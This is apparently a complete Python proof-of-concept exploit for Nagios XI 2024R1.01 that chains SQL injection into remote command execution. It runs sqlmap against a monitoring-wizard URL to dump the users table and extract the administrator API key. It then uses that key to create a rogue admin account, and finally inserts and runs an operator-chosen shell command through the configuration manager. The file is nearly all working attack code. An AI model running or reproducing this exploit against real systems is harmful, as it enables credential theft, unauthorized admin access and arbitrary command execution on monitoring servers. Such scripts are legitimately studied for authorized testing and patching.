import requests
import subprocess
import argparse
import re
import urllib3
import os
import random
import string
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def sqlmap(target,username,password):
    
   
    session = requests.session()
    try:
        s = session.get(f'http://{target}/nagiosxi/index.php', verify=False,timeout=5)
    except:
        print(f"{Fore.RED}[-] Server never responded... are you sure its up?")
        exit() 
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    print(f"{Fore.MAGENTA}[+] NSP captured: " + nsp)
    data = {"nsp": nsp, "page": "auth", "debug": '', "pageopt": "login", "username": username, "password": password, "loginButton": ''}
    s = session.post(f'http://{target}/nagiosxi/login.php', data=data)
    if "Invalid username or password." in s.text:
        print(f"{Fore.RED}[-] Authentication FAILED...")
        exit() 
    print(f"{Fore.GREEN}[+] Authenticated as User..")
    #this section resets the password just incase the account being used is brand new and requires pass change
    #print(f"{Fore.MAGENTA}[+] Accepting license Agreement...")
    s = session.get(f'http://{target}/nagiosxi/login.php?showlicense', verify=False)
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    data = {"page": "/nagiosxi/login.php", "pageopt": "agreelicense", "nsp": nsp, "agree_license": "on"}
    session.post(f"http://{target}/nagiosxi/login.php?showlicense", data=data)
    #print(f"{Fore.MAGENTA}[+] Performing mandatory password change ...")
    newPass = password
    data = {"page": "/nagiosxi/login.php", "pageopt": "changepass", "nsp": nsp,"current_password": password, "password1": newPass, "password2": newPass, "reporttimesubmitbutton": ''}
    session.post(f"http://{target}/nagiosxi/login.php?forcepasswordchange", data=data)
    s= session.get(f'http://{target}/nagiosxi/')
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    cookie = s.cookies.get('nagiosxi')
    print(f'{Fore.YELLOW}[+] Starting SQLMAP this could take a minute... ')
    sqlmap_command = f'sqlmap -u "http://{target}/nagiosxi//config/monitoringwizard.php/1*?update=1&nextstep=2&nsp={nsp}&wizard=mysqlserver" --cookie="nagiosxi={cookie}" --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10 --batch'
    #print(sqlmap_command)
    sqlmap_command_output = subprocess.Popen(sqlmap_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True )
    try:
        for line in iter(sqlmap_command_output.stdout.readline, ''):
            if "heuristic (basic) test shows that URI parameter '#1*' might not be injectable" in line:
                print(f"{Fore.RED}[+] It would apear this is a patched version... or there might be technology like WAF")
                exit() 
            if "(possible DBMS:" in line:
                print(f"{Fore.GREEN}[+] Target is vulnerable!!!")
                
            
            if "| Nagios Administrator |" in line:
                match = re.search(r"Nagios Administrator \| (.*?) \|", line)
                if match:
                    adminKey= match.group(1)
                    print(f"{Fore.GREEN}[+] Admin Key recovered: " + adminKey)
                    return adminKey
                else:
                    print(f"{Fore.RED}[-] Could not pull Admin Key :(....{Style.RESET_ALL}")
                    exit()
                
        print("[-] SQLMAP capture FAILED..")
        sqlmap_command_output.terminate()

    except KeyboardInterrupt:
        print(f"{Fore.RED}[-] SQLMAP interrupted. Cleaning up...{Style.RESET_ALL}")
        sqlmap_command_output.terminate()
        sqlmap_command_output.communicate()
        exit()

def createAdmin(target,adminKey):
    characters = string.ascii_letters + string.digits
    random_username = ''.join(random.choice(characters) for i in range(8))
    random_password = ''.join(random.choice(characters) for i in range(8))

    data = {"username": random_username, "password": random_password, "name": random_username, "email": f"{random_username}@mail.com", "auth_level": "admin"}
    r = requests.post(f'http://{target}/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)
    if "success" in r.text:
        print(f'{Fore.MAGENTA}[+] Admin account created...')
        return random_username, random_password
    else:
        print(f'{Fore.RED}[-] Account Creation Failed!!! :(...{Style.RESET_ALL}')
        print(r.text)
        exit()

def adminExploit(adminUsername, adminPassword, target, CMD):

    #print(f"{Fore.MAGENTA}[+] Conducting mandatory password change...")
    session = requests.session()
    s = session.get(f'http://{target}/nagiosxi/index.php', verify=False)
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    print(f"{Fore.MAGENTA}[+] NSP captured: " + nsp)
    data = {"nsp": nsp, "page": "auth", "debug": '', "pageopt": "login", "username": adminUsername, "password": adminPassword, "loginButton": ''}
    s = session.post(f'http://{target}/nagiosxi/login.php', data=data)
    print(f"{Fore.MAGENTA}[+] Authenticated as admin..")
    print(f"{Fore.MAGENTA}[+] Accepting license Agreement...")
    s = session.get(f'http://{target}/nagiosxi/login.php?showlicense', verify=False)
    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
    nsp = match.group(1)
    data = {"page": "/nagiosxi/login.php", "pageopt": "agreelicense", "nsp": nsp, "agree_license": "on"}
    session.post(f"http://{target}/nagiosxi/login.php?showlicense", data=data)
    #print(f"{Fore.MAGENTA}[+] Performing mandatory password change ARGH")
    newAdminPass = adminUsername + adminPassword
    data = {"page": "/nagiosxi/login.php", "pageopt": "changepass","current_password": adminPassword, "nsp": nsp, "password1": newAdminPass, "password2": newAdminPass, "reporttimesubmitbutton": ''}
    session.post(f"http://{target}/nagiosxi/login.php?forcepasswordchange", data=data)
    print(f"{Fore.MAGENTA}[+] Creating new command...")
    print(f"{Fore.GREEN}[*] EXECUTING: '{CMD}' on the target system")
    data = {"tfName": adminUsername, "tfCommand": f"{CMD}", "selCommandType": "1", "chbActive": "1", "cmd": "submit", "mode": "insert", "hidId": "0", "hidName": '', "hidServiceDescription": '', "hostAddress": "127.0.0.1", "exactType": "command", "type": "command", "genericType": "command"}
    session.post(f'http://{target}/nagiosxi/includes/components/ccm/index.php?type=command&page=1', data=data)
    data = {"cmd": '', "continue": ''}
    print(f"{Fore.MAGENTA}[+] Created command: " + adminUsername)
    session.post(f'http://{target}/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm', data=data)
    data = {"search": adminUsername}
    s = session.post(f'http://{target}/nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1', data=data)
    match = re.search(r"javascript:actionPic\('deactivate','(.*?)','", s.text)
    if match:
        commandCID = match.group(1)
        print(f"{Fore.MAGENTA}[+] Captured Command CID: " + commandCID)
        s = session.get(f"http://{target}/nagiosxi/includes/components/ccm/?cmd=view&type=service")
        match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
        if match:
            nsp = match.group(1)
            s = session.get(f"http://{target}/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid={commandCID}&nsp={nsp}")
            print(f"{Fore.RED}[+] COMMAND EXECUTED!!!")
        else:
            print(f"{Fore.RED}[-] ERROR")
    else:
        print(f"{Fore.RED}[-] Failed to capture Command CID..{Style.RESET_ALL}")




if __name__ == '__main__':
    ascii_art = f"""{Fore.LIGHTRED_EX}
███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
     {Style.RESET_ALL}                                                                                      
    """
    print(ascii_art)
    parser = argparse.ArgumentParser(description="SQL injection > RCE Script for Nagios XI Version 2024R1.01", usage= "sudo MawkNagiosXIPOC.py <Target>")
    parser.add_argument('target' ,help= "Target IP/hostname ")
    

    

    args = parser.parse_args()
    min_required_args = 1
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()
    if 'http' in args.target or '//' in args.target:
        print(f"{Fore.YELLOW}[-] Remove your http://, https://, or URI's")
        exit()
    CMD = input(f"{Fore.YELLOW}[*] Please input the command you want to execute on the target system: ")

    adminUsername, adminPassword = createAdmin(args.target, sqlmap(args.target,input(f"{Fore.MAGENTA}[+] Please insert a non-administrative username: "),input(f"{Fore.MAGENTA}[+] Please insert the password: ")))
    print(f"{Fore.MAGENTA}[+] Admin Username=" + adminUsername)
    print(f"{Fore.MAGENTA}[+] Admin Password=" + adminPassword)
    print(f"{Fore.RED}[+] Make sure to be a good pentester and cleanup after yo self boi")
    adminExploit(adminUsername, adminPassword, args.target,CMD)

